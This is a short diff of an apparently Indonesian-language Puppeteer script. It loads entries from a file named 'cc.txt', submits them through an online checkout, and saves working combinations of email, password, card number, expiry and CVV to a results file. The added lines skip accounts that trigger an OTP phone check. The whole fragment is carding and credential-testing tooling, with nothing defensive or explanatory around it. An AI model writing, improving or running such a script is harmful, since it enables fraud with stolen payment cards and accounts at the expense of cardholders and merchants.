@@ -84,8 +84,10 @@ const filemu = "cc.txt";
                             if(await page.url().indexOf("orderfinal") > -1) {
                                 console.log("|- Sukses Email"+email)
                                 await fsa.appendFile("result_sukses.txt", email+"|"+password+"|"+cc+"|"+exp+"|"+cvv+"\n", "utf-8");
-                                
                                 break
+                            } else if(await page.url().indexOf("otpPhoneEntry") > -1) {
+                                console.log("otp sob :(")
+                                continue
                             } else {
                                 console.log("|x Gagal :(\n")
                                 await browser.close()
